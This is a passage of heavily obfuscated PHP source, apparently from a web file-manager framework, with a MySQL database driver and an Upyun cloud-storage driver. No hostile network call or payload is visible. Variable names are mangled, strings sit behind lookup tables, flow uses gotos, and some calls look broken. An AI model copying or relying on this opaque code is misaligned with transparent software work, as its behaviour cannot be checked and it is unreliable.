$¿õİ¼Şô[473]) . $¿õİ¼Şô[473]; } return $éÃÖÚü‘; } } class DbMysqli extends Db { public function __construct($ªáÒØñÜ = '') { $ù‹’ê’¸ =& $_SERVER[‹‰”››ê]; if (!extension_loaded($ù‹’ê’¸[1005])) { think_exception(think_lang($ù‹’ê’¸[14]) . $ù‹’ê’¸[1006]); } if (!empty($ªáÒØñÜ)) { $this->config = $ªáÒØñÜ; if (empty($this->config[$ù‹’ê’¸[17]])) { $this->config[$ù‹’ê’¸[17]] = $ù‹’ê’¸[12]; } } } public function connect($³¬úş«Å = '', $±úãÍ• = 0) { $Æ§¹¸Åı =& $_SERVER[‹‰”››ê]; if (!isset($this->linkID[$±úãÍ•])) { if (empty($³¬úş«Å)) { $³¬úş«Å = $this->config; } $this->linkID[$±úãÍ•] = new mysqli($³¬úş«Å[$Æ§¹¸Åı[979]], $³¬úş«Å[$Æ§¹¸Åı[981]], $³¬úş«Å[$Æ§¹¸Åı[982]], $³¬úş«Å[$Æ§¹¸Åı[21]], $³¬úş«Å[$Æ§¹¸Åı[980]] ? intval($³¬úş«Å[$Æ§¹¸Åı[980]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $®»ÊÚ° = $this->linkID[$±úãÍ•]->server_version; $this->linkID[$±úãÍ•]->query($Æ§¹¸Åı[983] . think_config($Æ§¹¸Åı[984]) . $Æ§¹¸Åı[58]); if ($®»ÊÚ° > $Æ§¹¸Åı[985]) { $this->linkID[$±úãÍ•]->query($Æ§¹¸Åı[986]); } $this->connected = !0; if (1 != think_config($Æ§¹¸Åı[22])) { unset($this->config); } } return $this->linkID[$±úãÍ•]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($òä½€®º) { $·ıÄ—¸Ç =& $_SERVER[‹‰”››ê]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $òä½€®º; if ($this->queryID) { $this->free(); } think_action_status($·ıÄ—¸Ç[23], 1); think_status($·ıÄ—¸Ç[24]); $this->queryID = $this->_linkID->query($òä½€®º); if ($this->_linkID->more_results()) { while (($°ÀÃ²Ñì = $this->_linkID->next_result()) != NULL) { $°ÀÃ²Ñì->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($¯äÇàõÜ) { $Ø€ê“ÓÙ =& $_SERVER[‹‰”››ê]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¯äÇàõÜ; if ($this->queryID) { $this->free(); } think_action_status($Ø€ê“ÓÙ[25], 1); think_status($Ø€ê“ÓÙ[24]); $·ºÀ¹ü¿ = $this->_linkID->query($¯äÇàõÜ); $this->debug(); if (!1 === $·ºÀ¹ü¿) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¹ƒø©ğ‘ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$¹ƒø©ğ‘) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $º²£¶º = $this->_linkID->rollback(); $this->transTimes = 0; if (!$º²£¶º) { $this->error(); return !1; } } return !0; } private function getAll() { $®Ú™Õ«« = array(); if ($this->numRows > 0) { for ($úÄˆÓßİ = 0; $úÄˆÓßİ < $this->numRows; $úÄˆÓßİ++) { $®Ú™Õ««[$úÄˆÓßİ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $®Ú™Õ««; } public function getFields($Ãù¿Î©) { $¯ƒ€óö =& $_SERVER[‹‰”››ê]; $á¿á¾œÙ = $this->query($¯ƒ€óö[990] . $this->parseKey($Ãù¿Î©)); $»ö”Â™ = array(); if ($á¿á¾œÙ) { foreach ($á¿á¾œÙ as $ÄÕ•Ó”Ç => $õìĞş•¸) { $»ö”Â™[$õìĞş•¸[$¯ƒ€óö[31]]] = array($¯ƒ€óö[32] => $õìĞş•¸[$¯ƒ€óö[31]], $¯ƒ€óö[33] => $õìĞş•¸[$¯ƒ€óö[34]], $¯ƒ€óö[35] => (bool) ($õìĞş•¸[$¯ƒ€óö[36]] === $¯ƒ€óö[12]), $¯ƒ€óö[37] => $õìĞş•¸[$¯ƒ€óö[38]], $¯ƒ€óö[39] => strtolower($õìĞş•¸[$¯ƒ€óö[40]]) == $¯ƒ€óö[41], $¯ƒ€óö[42] => strtolower($õìĞş•¸[$¯ƒ€óö[43]]) == $¯ƒ€óö[44]); } } return $»ö”Â™; } public function getTables($ÕÁšÌÖ¢ = '') { $£â¶Ò› =& $_SERVER[‹‰”››ê]; $³æÄÁ¯ = !empty($ÕÁšÌÖ¢) ? $£â¶Ò›[992] . $ÕÁšÌÖ¢ . $£â¶Ò›[993] : $£â¶Ò›[994]; $¹¢åƒ§£ = $this->query($³æÄÁ¯); $ñ˜¥™¨™ = array(); if ($¹¢åƒ§£) { foreach ($¹¢åƒ§£ as $ëñÊıÈ => $Š×ªøš) { $ñ˜¥™¨™[$ëñÊıÈ] = current($Š×ªøš); } } return $ñ˜¥™¨™; } public function replace($µ÷ÖÖÑ, $‚ºıáĞ = array()) { $Ô–ß ¸ı =& $_SERVER[‹‰”››ê]; foreach ($µ÷ÖÖÑ as $ˆ¥æ ùå => $é½¦˜Ÿ°) { $êâÛ–ÔÖ = $this->parseValue($é½¦˜Ÿ°); if (is_scalar($êâÛ–ÔÖ)) { $¯Ä†øûÉ[] = $êâÛ–ÔÖ; $ºÙÔäÉ”[] = $this->parseKey($ˆ¥æ ùå); } } $íá‡ù÷³ = $Ô–ß ¸ı[995] . $this->parseTable($‚ºıáĞ[$Ô–ß ¸ı[368]]) . $Ô–ß ¸ı[996] . implode($Ô–ß ¸ı[50], $ºÙÔäÉ”) . $Ô–ß ¸ı[997] . implode($Ô–ß ¸ı[50], $¯Ä†øûÉ) . $Ô–ß ¸ı[998]; return $this->execute($íá‡ù÷³); } public function insertAll($÷Ó¦ŸŸë, $¸è©…¶ = array(), $”ù¡„„„ = false) { $œƒşÆÍñ =& $_SERVER[‹‰”››ê]; if (!is_array($÷Ó¦ŸŸë[0])) { return !1; } $ªÜï’ˆŠ = array_keys($÷Ó¦ŸŸë[0]); $õƒ”Õµ¢ = array(); foreach ($÷Ó¦ŸŸë as $ŠŞæâÖı) { $¢Ñ½—€À = array(); foreach ($ŠŞæâÖı as $†¡ü­ => $™ ÄËôƒ) { $™ ÄËôƒ = $this->parseValue($™ ÄËôƒ); if (is_scalar($™ ÄËôƒ)) { $¢Ñ½—€À[] = $™ ÄËôƒ; } } $õƒ”Õµ¢[] = $œƒşÆÍñ[349] . implode($œƒşÆÍñ[50], $¢Ñ½—€À) . $œƒşÆÍñ[998]; } array_walk($ªÜï’ˆŠ, array($this, $œƒşÆÍñ[999])); $ Üª£…¬ = $”ù¡„„„ ? $œƒşÆÍñ[1000] : $œƒşÆÍñ[1001]; $šâá†ø¥ = $ Üª£…¬ . $œƒşÆÍñ[1002] . $this->parseTable($¸è©…¶[$œƒşÆÍñ[368]]) . $œƒşÆÍñ[996] . implode($œƒşÆÍñ[50], $ªÜï’ˆŠ) . $œƒşÆÍñ[1003] . implode($œƒşÆÍñ[50], $õƒ”Õµ¢); return $this->execute($šâá†ø¥); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Ã•º…”á =& $_SERVER[‹‰”››ê]; $this->error = $this->_linkID->errno . $Ã•º…”á[4] . $this->_linkID->error; if ($Ã•º…”á[12] != $this->queryStr) { $this->error .= LNG($Ã•º…”á[48]) . $this->queryStr; } think_trace($this->error, $Ã•º…”á[12], $Ã•º…”á[49]); return $this->error; } public function escapeString($ŠÀ¶äÎ·) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ŠÀ¶äÎ·); } else { return addslashes($ŠÀ¶äÎ·); } } public function parseKey(&$î‡Œšõ, $ÇšŸ»¤— = true) { $§¿õÅ²æ =& $_SERVER[‹‰”››ê]; if ($ÇšŸ»¤—) { $î‡Œšõ = $this->parseKeyCheck($î‡Œšõ); } if ($î‡Œšõ != $§¿õÅ²æ[223] && !preg_match($§¿õÅ²æ[1004], $î‡Œšõ)) { $î‡Œšõ = $§¿õÅ²æ[473] . trim($î‡Œšõ, $§¿õÅ²æ[473]) . $§¿õÅ²æ[473]; } return $î‡Œšõ; } } goto C¡ùÁµ¡ƒ¯; d…ÀÑÃİÏ: function binCheckBigger($Î„úİŒÜ, $³èÙåğÒ) { return $Î„úİŒÜ > $³èÙåğÒ; } $_SERVER[$_SERVER[ÓÎ®ç»•][3]] = (base64_decode('ODYxOA==')."\x34\x37")+0;$_vheo="zg8px1tuobnkjl9va4edws5fic2m76yh3rq0obx5f8z7ac096t3verpmjwdlsh2gy1kqi";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($Æ€«˜ìı, $·âØ†ãğ) { $ÎöÁ¨Â½ =& $_SERVER[‹‰”››ê]; if (isset(self::$_methodList[$Æ€«˜ìı])) { return @call_user_func_array(self::$_methodList[$Æ€«˜ìı], $·âØ†ãğ); } else { if (method_exists($this, $Æ€«˜ìı)) { return call_user_func_array(array($this, $Æ€«˜ìı), $·âØ†ãğ); } else { think_exception(__CLASS__ . $ÎöÁ¨Â½[4] . $Æ€«˜ìı . $ÎöÁ¨Â½[5]); } } } public static function __callStatic($Ô“×™«ú, $·àÅÚÊ®) { if (isset(self::$_methodListStatic[$Ô“×™«ú])) { return call_user_func_array(self::$_methodListStatic[$Ô“×™«ú], $·àÅÚÊ®); } else { if (method_exists(self, $Ô“×™«ú)) { return call_user_func_array(array(self, $Ô“×™«ú), $·àÅÚÊ®); } else { show_json("{$Ô“×™«ú}\50\51\40\x6e\157\x74\40\145\x78\151\x73\164\x3b", !1); } } } public static function addMethod($¿«¨¢½İ, $‚ßáèäê) { self::$_methodList[$¿«¨¢½İ] = $‚ßáèäê; } public static function addMethodStatic($ü×å§¤ç, $Áò‚£û) { self::$_methodListStatic[$ü×å§¤ç] = $Áò‚£û; } } goto aÓôÅ¥’Ï; DÕã§™Ï—: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\x74\160\72\57\x2f\166\x30\x2e\141\x70\x69\56\x75\x70\x79\165\156\x2e\143\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($ÁÓüÅ¿ø) { parent::__construct(); $this->_init($ÁÓüÅ¿ø); } public function _init($¹±ÆÖÂØ) { $­§„Ú–š =& $_SERVER[‹‰”››ê]; foreach ($¹±ÆÖÂØ as $¿–¢¨ş¾ => $äÉê‡â) { if (isset($this->{$¿–¢¨ş¾})) { $this->{$¿–¢¨ş¾} = $äÉê‡â; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($­§„Ú–š[1562] . LNG($­§„Ú–š[1482])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($şÉ¶…ş¡, $İ’Í”†£ = "\107\x45\124") { $İœ•¼° =& $_SERVER[‹‰”››ê]; $Ö±¹ï—„ = gmdate($İœ•¼°[1511]); $îÎƒÅÁƒ = base64_encode(hash_hmac($İœ•¼°[1563], "{$İ’Í”†£}\x26{$şÉ¶…ş¡}\46{$Ö±¹ï—„}", md5("{$this->userpass}"), !0)); $Â˜ÖĞ£“ = array("\x41\x75\x74\x68\157\162\x69\x7a\x61\x74\151\x6f\x6e\72\125\120\x59\x55\116\x20{$this->username}\x3a{$îÎƒÅÁƒ}", "\104\x61\x74\145\x3a{$Ö±¹ï—„}"); return $Â˜ÖĞ£“; } public function ussRequest($ò¬ÁÁ¤“, $«­Ø›¡Â = "\x47\x45\x54", $¢£Òõ‰ = false, $®Èáô›½ = false, $ÛŒÈÒŒÎ = false) { $á…İõ™± =& $_SERVER[‹‰”››ê]; $ò¬ÁÁ¤“ = trim($ò¬ÁÁ¤“, $á…İõ™±[8]); $ù´åĞ€½ = "\x2f{$this->bucket}\x2f" . rawurlencode($ò¬ÁÁ¤“); $Ñõ…Šƒ = $this->ussHeaders($ù´åĞ€½, $«­Ø›¡Â); if ($®Èáô›½) { $Ñõ…Šƒ = array_merge($Ñõ…Šƒ, $®Èáô›½); } $µÖÇ˜ğ‚ = url_request($this->endpoint . $ù´åĞ€½, $«­Ø›¡Â, $¢£Òõ‰, $Ñõ…Šƒ, $ÛŒÈÒŒÎ); if (!$µÖÇ˜ğ‚) { $©ÕœòÖâ = LNG($á…İõ™±[1564]); $this->writeLog($©ÕœòÖâ); return array($á…İõ™±[1313] => !1, $á…İõ™±[1303] => $©ÕœòÖâ); } if (strtolower($«­Ø›¡Â) == $á…İõ™±[230] || in_array($µÖÇ˜ğ‚[$á…İõ™±[1313]], array($á…İõ™±[264], $á…İõ™±[1565]))) { $¢£Òõ‰ = $µÖÇ˜ğ‚[$á…İõ™±[1566]]; if (!$µÖÇ˜ğ‚[$á…İõ™±[840]]) { $¢£Òõ‰ = isset($¢£Òõ‰[0]) ? $¢£Òõ‰[0] : $á…İõ™±[12]; } } else { $¢£Òõ‰ = json_decode($µÖÇ˜ğ‚[$á…İõ™±[1303]], !0); if (!$¢£Òõ‰) { $¢£Òõ‰ = $µÖÇ˜ğ‚[$á…İõ™±[1303]]; } else { if (!$µÖÇ˜ğ‚[$á…İõ™±[840]] && isset($¢£Òõ‰[$á…İõ™±[1567]])) { $¢£Òõ‰ = $¢£Òõ‰[$á…İõ™±[1567]]; } } } if (!$µÖÇ˜ğ‚[$á…İõ™±[840]]) { $this->writeLog($this->__errorMessage($¢£Òõ‰)); } return array($á…İõ™±[1313] => $µÖÇ˜ğ‚[$á…İõ™±[840]], $á…İõ™±[1303] => $¢£Òõ‰); } private function __errorMessage($À¹Óüá) { $ØÖ°­à =& $_SERVER[‹‰”››ê]; if (!$À¹Óüá) { return $ØÖ°­à[12]; } static $×šøË˜¹ = null; if (!$×šøË˜¹) { $×šøË˜¹ = I18n::getType(); } if ($×šøË˜¹ != $ØÖ°­à[1520]) { return $À¹Óüá; } $×äÊ£²í = array($ØÖ°­à[1568] => $ØÖ°­à[1569], $ØÖ°­à[1570] => $ØÖ°­à[1571], $ØÖ°­à[1572] => $ØÖ°­à[1571], $ØÖ°­à[1573] => $ØÖ°­à[1574], $ØÖ°­à[1575] => $ØÖ°­à[1576], $ØÖ°­à[1577] => $ØÖ°­à[1578], $ØÖ°­à[1579] => $ØÖ°­à[1580]); return isset($×äÊ£²í[$À¹Óüá]) ? $×äÊ£²í[$À¹Óüá] : $À¹Óüá; } public function mkfile($¡å¿êõÀ, $ûƒõâÔÌ = '', $ã¼Îê· = REPEAT_RENAME) { if ($this->setContent($¡å¿êõÀ, $ûƒõâÔÌ)) { return $this->getPathOuter($¡å¿êõÀ); } return !1; } public function mkdir($Ü¥Ø¸è¶, $£á÷ˆƒ = REPEAT_SKIP) { $¿¦«²ºÆ =& $_SERVER[‹‰”››ê]; $ø¼Ûşˆç = trim($Ü¥Ø¸è¶, $¿¦«²ºÆ[8]); if ($this->_isFolder($ø¼Ûşˆç)) { return $this->getPathOuter($ø¼Ûşˆç); } $„ÏÙ´¨Â = array($¿¦«²ºÆ[1581]); $îÖĞ‹éØ = $this->ussRequest($ø¼Ûşˆç, $¿¦«²ºÆ[291], !1, $„ÏÙ´¨Â); return $îÖĞ‹éØ[$¿¦«²ºÆ[1313]] ? $this->getPathOuter($ø¼Ûşˆç) : !1; } public function copyFile($Œô®Ãñœ, $ÀÇÂÉ‰°) { $±Åáº =& $_SERVER[‹‰”››ê]; $×’Õú‚ò = array($±Åáº[1582] . "\x2f{$this->bucket}\x2f{$Œô®Ãñœ}", $±Åáº[1583]); $Ó¯æ½ = $this->ussRequest($ÀÇÂÉ‰°, $±Åáº[256], !1, $×’Õú‚ò); return $Ó¯æ½[$±Åáº[1313]] ? !0 : $this->getPathOuter($ÀÇÂÉ‰°); } public function moveFile($áÈ©Çøó, $ë¥çĞ…) { $éŒ­ÛÇ¼ =& $_SERVER[‹‰”››ê]; $”® Ì¯· = array($éŒ­ÛÇ¼[1584] . "\x2f{$this->bucket}\x2f{$áÈ©Çøó}", $éŒ­ÛÇ¼[1583]); $—ü§ş„ = $this->ussRequest($ë¥çĞ…, $éŒ­ÛÇ¼[256], !1, $”® Ì¯·); return $—ü§ş„[$éŒ­ÛÇ¼[1313]] ? !0 : $this->getPathOuter($ë¥çĞ…); } public function delFile($¢›Ó´ó¦) { $æê·Ö² =& $_SERVER[‹‰”››ê]; $‹†Ä»ª‹ = $this->ussRequest($¢›Ó´ó¦, $æê·Ö²[1585]); return $‹†Ä»ª‹[$æê·Ö²[1313]] ? !0 : !1; } public function delFolder($ÄË°ÖĞ) { $¦²óŞä =& $_SERVER[‹‰”››ê]; if (!$this->exist($ÄË°ÖĞ)) { return !0; } $this->listItemCache = !1; $º´ïä¥ = $¶šåŠ¶ = array(); $this->fileList($ÄË°ÖĞ, $º´ïä¥, $¶šåŠ¶, !0); $this->listItemCache = !0; foreach ($¶šåŠ¶ as $òìê¾İ») { $¹Û¢´¹Ç = $this->ussRequest($òìê¾İ»[$¦²óŞä[32]], $¦²óŞä[1585]); if (!$¹Û¢´¹Ç[$¦²óŞä[1313]]) { return !1; } } usort($º´ïä¥, function ($í¬íÒ½, $øìÁ—Â”) { $ö‚à­±Â =& $_SERVER[‹‰”››ê]; return substr_count($øìÁ—Â”, $ö‚à­±Â[8]) - substr_count($í¬íÒ½, $ö‚à­±Â[8]); }); foreach ($º´ïä¥ as $ĞÁ¯Î¸) { $¹Û¢´¹Ç = $this->ussRequest($ĞÁ¯Î¸, $¦²óŞä[1585]); if (!$¹Û¢´¹Ç[$¦²óŞä[1313]]) { return !1; } } $¹Û¢´¹Ç = $this->ussRequest($ÄË°ÖĞ, $¦²óŞä[1585]); return $¹Û¢´¹Ç[$¦²óŞä[1313]]; } public function rename($ÚüÔÈ²ñ, $ö­·Ñ¤£) { if ($this->isFile($ÚüÔÈ²ñ)) { $ö­·Ñ¤£ = get_path_father($ÚüÔÈ²ñ) . $ö­·Ñ¤£; return $this->moveFile($ÚüÔÈ²ñ, $ö­·Ñ¤£); } return $this->renameObject($ÚüÔÈ²ñ, $ö­·Ñ¤£); } public function fileInfo($çùñ‚ÔÎ, $„’İŠ”¾ = false, $Ìêİßúœ = array()) { $„¶²‡ =& $_SERVER[‹‰”››ê]; $Œ¹îºŠè = array($„¶²‡[32] => $this->pathThis($çùñ‚ÔÎ), $„¶²‡[87] => $this->getPathOuter($„¶²‡[8] . $çùñ‚ÔÎ), $„¶²‡[33] => $„¶²‡[233], $„¶²‡[79] => isset($Ìêİßúœ[$„¶²‡[79]]) ? $Ìêİßúœ[$„¶²‡[79]] : 0, $„¶²‡[169] => $this->ext($çùñ‚ÔÎ)); if ($„’İŠ”¾) { return $Œ¹îºŠè; } $Œ¹îºŠè[$„¶²‡[234]] = $Œ¹îºŠè[$„¶²‡[88]] = 0; $Œ¹îºŠè[$„¶²‡[235]] = $Œ¹îºŠè[$„¶²‡[236]] = !0; if (empty($Ìêİßúœ)) { $Ìêİßúœ = $this->objectMeta($çùñ‚ÔÎ); if (!$Ìêİßúœ) { return $Œ¹îºŠè; } } $Œ¹îºŠè[$„¶²‡[234]] = intval($Ìêİßúœ[$„¶²‡[1586]]); $Œ¹îºŠè[$„¶²‡[88]] = intval($Ìêİßúœ[$„¶²‡[1587]]); $Œ¹îºŠè[$„¶²‡[79]] = $Ìêİßúœ[$„¶²‡[79]]; return $Œ¹îºŠè; } public function folderInfo($²Ú”À¹ı, $´‹òş¯ò = false) { $®£İÍêŸ =& $_SERVER[‹‰”››ê]; $»­›Ğ’ = array($®£İÍêŸ[32] => $this->pathThis($²Ú”À¹ı), $®£İÍêŸ[87] => $this->getPathOuter($®£İÍêŸ[8] . $²Ú”À¹ı), $®£İÍêŸ[33] => $®£İÍêŸ[78]); if ($´‹òş¯ò) { return $»­›Ğ’; } $»­›Ğ’[$®£İÍêŸ[234]] = $»­›Ğ’[$®£İÍêŸ[88]] = 0; $»­›Ğ’[$®£İÍêŸ[235]] = $»­›Ğ’[$®£İÍêŸ[236]] = !0; if (empty($³Ú› ­Ï)) { $³Ú› ­Ï = $this->objectMeta($²Ú”À¹ı); if (!$³Ú› ­Ï) { return $»­›Ğ’; } } $»­›Ğ’[$®£İÍêŸ[234]] = intval($³Ú› ­Ï[$®£İÍêŸ[1586]]); $»­›Ğ’[$®£İÍêŸ[88]] = intval($³Ú› ­Ï[$®£İÍêŸ[1587]]); return $»­›Ğ’; } private function listObjs($ë«Í¹Âº, $—Á¤Œ… = 0, $¡¦òÄ“¨ = 1000) { $Î˜¥€Á =& $_SERVER[‹‰”››ê]; $Âû‹ •Ö = array($Î˜¥€Á[1588], $Î˜¥€Á[1589] . $¡¦òÄ“¨); if ($—Á¤Œ…) { $Âû‹ •Ö[] = $Î˜¥€Á[1590] . $—Á¤Œ…; } $Õ¯ì¿¬ = $this->ussRequest($ë«Í¹Âº, $Î˜¥€Á[1513], !1, $Âû‹ •Ö); return !$Õ¯ì¿¬[$Î˜¥€Á[1313]] ? !1 : $Õ¯ì¿¬[$Î˜¥€Á[1303]]; } private function fileList($³ı°á³, &$ëºó Æã, &$öŞôŞÕë, $–Òß®¤½ = false) { $îñ¯òÔœ =& $_SERVER[‹‰”››ê]; $è±¦©· = $îñ¯òÔœ[12]; $†úÆ»ÔŠ = 1000; $åŸçšîÕ = rtrim($³ı°á³, $îñ¯òÔœ[8]) . $îñ¯òÔœ[8]; while (!0) { check_abort(); $ ªÊì¯¾ = $this->listObjs($³ı°á³, $è±¦©·, $†úÆ»ÔŠ); if (!$ ªÊì¯¾) { return !1; } $è±¦©· = isset($ ªÊì¯¾[$îñ¯òÔœ[1591]]) ? $ ªÊì¯¾[$îñ¯òÔœ[1591]] : $îñ¯òÔœ[12]; $³Ë¤„ëÀ = isset($ ªÊì¯¾[$îñ¯òÔœ[1592]]) ? $ ªÊì¯¾[$îñ¯òÔœ[1592]] : array(); foreach ($³Ë¤„ëÀ as $ÚœĞ ë) { $éŠ÷Â°Æ = $ÚœĞ ë[$îñ¯òÔœ[33]] == $îñ¯òÔœ[78] ? !0 : !1; $×©–â‰ã = ltrim($åŸçšîÕ . $ÚœĞ ë[$îñ¯òÔœ[32]], $îñ¯òÔœ[8]) . ($éŠ÷Â°Æ ? $îñ¯òÔœ[8] : $îñ¯òÔœ[12]); $½’èí‘ = array($îñ¯òÔœ[32] => $×©–â‰ã, $îñ¯òÔœ[33] => $éŠ÷Â°Æ ? $îñ¯òÔœ[78] : $îñ¯òÔœ[233], $îñ¯òÔœ[79] => $ÚœĞ ë[$îñ¯òÔœ[424]], $îñ¯òÔœ[1587] => $ÚœĞ ë[$îñ¯òÔœ[1593]]); $this->cacheMethodInfoSet($×©–â‰ã, $éŠ÷Â°Æ, $½’èí‘); if ($éŠ÷Â°Æ) { $ëºó Æã[] = $×©–â‰ã; if ($–Òß®¤½) { $this->fileList($×©–â‰ã, $ëºó Æã, $öŞôŞÕë, $–Òß®¤½); } continue; } $öŞôŞÕë[] = $½’èí‘; } if (count($³Ë¤„ëÀ) < $†úÆ»ÔŠ) { break; } } $this->cacheMethodInfoSet($³ı°á³, !0); } public function listPath($Ÿè¯şşö, $ª¤ğÑÈ“ = false) { $Ø½´âÌ½ =& $_SERVER[‹‰”››ê]; $‡¦™ˆ»ç = $º·Õ“ãû = array(); $this->fileList($Ÿè¯şşö, $‡¦™ˆ»ç, $º·Õ“ãû); foreach ($‡¦™ˆ»ç as $èœ—…æš => $ß‹»‹ùĞ) { $‡¦™ˆ»ç[$èœ—…æš] = $this->folderInfo($ß‹»‹ùĞ, $ª¤ğÑÈ“); } foreach ($º·Õ“ãû as $èœ—…æš => $ß‹»‹ùĞ) { $º·Õ“ãû[$èœ—…æš] = $this->fileInfo($ß‹»‹ùĞ[$Ø½´âÌ½[32]], $ª¤ğÑÈ“, $ß‹»‹ùĞ); } return array($Ø½´âÌ½[85] => $‡¦™ˆ»ç, $Ø½´âÌ½[86] => $º·Õ“ãû); } public function has($—’®ãµ“, $ÌØçëû£ = false, $ ›ÈªúÃ = true) { $¦Ì¬…º =& $_SERVER[‹‰”››ê]; $‚ÒßúÀ = $¦Ì¬…º[12]; $Éü¸¦ëí = 500; $íÓÂË‘™ = 0; $ˆêáéœ = 0; $Õöüöè = rtrim($—’®ãµ“, $¦Ì¬…º[8]) . $¦Ì¬…º[8]; while (!0) { check_abort(); $‡Ö³®Œ = $this->listObjs($—’®ãµ“, $‚ÒßúÀ, $Éü¸¦ëí); if (!$‡Ö³®Œ) { return !1; } $‚ÒßúÀ = isset($‡Ö³®Œ[$¦Ì¬…º[1591]]) ? $‡Ö³®Œ[$¦Ì¬…º[1591]] : $¦Ì¬…º[12]; $ÔŒûùÊò = isset($‡Ö³®Œ[$¦Ì¬…º[1592]]) ? $‡Ö³®Œ[$¦Ì¬…º[1592]] : array(); if (empty($ÔŒûùÊò)) { break; } $Ç”›¦¢ = array_filter($ÔŒûùÊò, function ($Îê›İ”Ò) { $ê–à¹õ‰ =& $_SERVER[‹‰”››ê]; return $Îê›İ”Ò[$ê–à¹õ‰[33]] == $ê–à¹õ‰[78]; }); $ØÜÓĞğó = count($ÔŒûùÊò); $Ç”›¦¢ = count($Ç”›¦¢); $™µ‡ıé = $ØÜÓĞğó - $Ç”›¦¢; if ($ÌØçëû£) { $ˆêáéœ += $Ç”›¦¢; $íÓÂË‘™ += $™µ‡ıé; if ($ØÜÓĞğó < $Éü¸¦ëí) { break; } continue; } if ($ ›ÈªúÃ) { if ($™µ‡ıé) { return !0; } } else { if ($Ç”›¦¢) { return !0; } } if ($ØÜÓĞğó < $Éü¸¦ëí) { break; } } if ($ÌØçëû£) { return array($¦Ì¬…º[242] => $íÓÂË‘™, $¦Ì¬…º[243] => $ˆêáéœ); } return !1; } public function listAll($Ï“õ“ëŸ) { $Ë¼Â¦Ë’ =& $_SERVER[‹‰”››ê]; $§ôÜ•ÈÄ = $ÏûÈ³„ = array(); $this->fileList($Ï“õ“ëŸ, $§ôÜ•ÈÄ, $ÏûÈ³„, !0); $Æè‡ÆÒ  = array_to_keyvalue($ÏûÈ³„, $Ë¼Â¦Ë’[32]); foreach ($§ôÜ•ÈÄ as $ıÏ„æ²) { if (is_string($ıÏ„æ²)) { $Æè‡ÆÒ [$ıÏ„æ²] = array($Ë¼Â¦Ë’[79] => 0); } } return $this->listAllFiles($Ï“õ“ëŸ, $Æè‡ÆÒ ); } public function canRead($ø€Ä­ú´) { return $this->exist($ø€Ä­ú´) ? !0 : !1; } public function canWrite($Ú×ÀÕ‚) { return $this->exist($Ú×ÀÕ‚) ? !0 : !1; } public function getContent($ëØıÑ‡) { return $this->fileSubstr($ëØıÑ‡, 0, -1); } public function setContent($‡ó¾ğØ¸, $îõ»´ = '') { $Öí´±˜Ü =& $_SERVER[‹‰”››ê]; if (!$îõ»´) { $Ï·õŒ = $this->ussRequest($‡ó¾ğØ¸, $Öí´±˜Ü[291]); return $Ï·õŒ[$Öí´±˜Ü[1313]]; } $ü¨ËƒÉØ = $this->tempFile($this->pathThis($‡ó¾ğØ¸)); file_put_contents($ü¨ËƒÉØ, $îõ»´); if ($this->upload($‡ó¾ğØ¸, $ü¨ËƒÉØ)) { $this->tempFileRemve($ü¨ËƒÉØ); return !0; } return !1; } public function fileSubstr($ÚŒ³¹ŞÌ, $íô»¦½õ, $¯Ïù’‡) { $Â¾äü‚‹ =& $_SERVER[‹‰”››ê]; if (!($Öä¹¦äİ = $this->link($ÚŒ³¹ŞÌ))) { return !1; } $ÃÇ¼¼ê´ = !1; if ($¯Ïù’‡ > 0) { $–›ÌÏÊ» = $íô»¦½õ + $¯Ïù’‡ - 1; $ÃÇ¼¼ê´ = array($Â¾äü‚‹[1552] . $íô»¦½õ . $Â¾äü‚‹[474] . $–›ÌÏÊ»); } $„Š¸ïæ¾ = url_request($Öä¹¦äİ, $Â¾äü‚‹[1513], !1, $ÃÇ¼¼ê´); return $„Š¸ïæ¾[$Â¾äü‚‹[840]] ? $„Š¸ïæ¾[$Â¾äü‚‹[1303]] : !1; } public function upload($¸¡’æ÷µ, $¤ºÀœáÇ, $¢çÎùˆ— = false, $É Ë•ƒÌ = REPEAT_REPLACE) { $í¸Ğˆœ– =& $_SERVER[‹‰”››ê]; $Ş‚‚ëŠ‡ = IO::size($¤ºÀœáÇ); if ($Ş‚‚ëŠ‡ <= 1024 * 1024 * 200) { $óùñÅÖ = array($í¸Ğˆœ–[1594] . $¤ºÀœáÇ); $ÊşŸ†ô½ = $this->ussRequest($¸¡’æ÷µ, $í¸Ğˆœ–[256], $óùñÅÖ); return $ÊşŸ†ô½[$í¸Ğˆœ–[1313]] ? $this->getPathOuter($¸¡’æ÷µ) : !1; } $É§î¯³¼ = 1024 * 1024 * 10; $Ö¾æß©Ë = array($í¸Ğˆœ–[1595], $í¸Ğˆœ–[1596] . $Ş‚‚ëŠ‡, $í¸Ğˆœ–[1597], $í¸Ğˆœ–[1598] . $É§î¯³¼); $ÊşŸ†ô½ = $this->ussRequest($¸¡’æ÷µ, $í¸Ğˆœ–[256], !1, $Ö¾æß©Ë); if (!$ÊşŸ†ô½[$í¸Ğˆœ–[1313]]) { return !1; } $ôŸäàùª = $ÊşŸ†ô½[$í¸Ğˆœ–[1303]]; $õªõ·˜² = 0; 